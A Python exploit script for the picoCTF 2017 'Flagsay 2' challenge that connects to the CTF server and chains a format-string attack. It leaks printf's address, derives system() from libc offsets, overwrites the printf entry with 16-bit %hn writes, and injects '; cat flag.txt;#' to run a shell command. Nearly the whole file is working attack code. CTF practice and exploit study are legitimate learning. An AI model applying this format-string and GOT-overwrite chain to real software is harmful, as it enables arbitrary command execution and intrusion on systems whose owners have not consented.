"""Demonstration of the exploitation of a vulnerability in picoCTF 2017's Flagsay 2 problem"""

from binascii import b2a_hex
from socket import socket, AF_INET, SOCK_STREAM
from struct import pack
from sys import argv
import time


# printf link
PRINTF_PLT = 0x8049970
# printf link offset for partial modification
PRINTF_OFFSET_PLT = PRINTF_PLT + 2
# Offset due to flag characters in the C program
FLAG_OFFSET = 129
# Offsets from 32-bit libc base
PRINTF_OFFSET = 0x4cc70
SYSTEM_OFFSET = 0x3e3e0

TARGET = "shell2017.picoctf.com"
PORT = 44887

sock = socket(AF_INET, SOCK_STREAM)
sock.connect((TARGET, PORT))
sock.setblocking(0)


def receive():
	"""Receives TCP data in segments

	Returns:
		The total data from all received segments
	"""
	net_data = ""
	start = time.time()
	while True:
		if time.time() - start > .5:
			break
		try:
			data = sock.recv(4096)
			if data:
				start = time.time()
				net_data += data
			else:
				time.sleep(0.1)
		except:
			pass
	return net_data


def send(msg):
	"""Sends TCP data terminated with newline character for a prompt"""
	sock.sendall(msg + "\n")


def format_string(value, location, modifier=""):
	"""Forms a string that will modify stack values in a C printf call directly on user input

	Args:
		value: Integer value to be written into the stack
		location: Number of pops required to reach the location to be written to
		modifier: String to be added to %n flag: h for 16-bit modification; hh for 8-bit modification

	Returns:
		A formatted string for use in a C printf vulnerability
	"""
	formatted_string = "%" + str(value) + "x" + "%" + str(location) + "$" + modifier + "n"
	return formatted_string

print(argv[0] + ": Exploit initiated. Average return time is 25 seconds due to large string usage, so please be patient.\n")

# BEGINNING OF STAGE 1
print("+ Determining printf() system address...")

print("\t* Writing printf() pointer to stack location 16 using a pointer at stack location 9")
payload = format_string(PRINTF_PLT - FLAG_OFFSET, 9)
print("\t\t* DATA SENT: " + payload)
send(payload)

receive()

print("\t* Dereferencing printf() pointer at stack location 16 to determine true address")
payload = "%16$s"
print("\t\t* DATA SENT: " + payload)
send(payload)

# Response to be used in the next stage
response = receive()
# END OF STAGE 1

# BEGINNING OF STAGE 2
print("+ Calculating offset for system() call...")

print("\t* Converting printf() true address into hexadecimal")
response = "".join(response.split(" ")[86:89])
response = str(b2a_hex(response))[:12]

print("\t* Formatting printf() true address from binary into integer form")
# Must reverse because system is little-endian
printf_addr = "0x" + response[-2:] + response[-4:-2] + response[-6:-4] + response[-8:-6]
print("\t\t* printf() true address: " + printf_addr)
# Conversion actually happens here
printf_addr = int(printf_addr, 16)

print("\t* Calculating libc offsets to obtain system() address")
system_addr = printf_addr - PRINTF_OFFSET + SYSTEM_OFFSET
system_addr = hex(system_addr)
print("\t\t* system() true address: " + system_addr)

print("\t* Segmenting system address to write in 16-bit parts")
system_addr_seg = ("0x" + system_addr[2:-4], "0x" + system_addr[-4:])

print("\t* Priming stack by creating a pointer to the first half of printf() address")
payload = format_string(PRINTF_OFFSET_PLT - FLAG_OFFSET, 18)
print("\t\t* DATA SENT: " + payload)
send(payload)

receive()

print("\t* Rewriting printf() address to system() address")
# Note: Second write does not require subtracting FLAG_OFFSET
first_write = int(system_addr_seg[1], 16) - FLAG_OFFSET
second_write = int(system_addr_seg[0], 16) - int(system_addr_seg[1], 16)
payload = format_string(first_write, 16, "h")
payload += format_string(second_write, 55, "h")
print("\t\t* DATA SENT: " + payload)
send(payload)

receive()

# END OF STAGE 2

# BEGINNING OF STAGE 3
print("+ Executing payload (cat flag.txt)...")
payload = "; cat flag.txt;#"
print("\t* DATA SENT: " + payload)
send(payload)
print("===Done! Last server response (includes flag):===\n" + receive())
# END OF STAGE 3

sock.close()
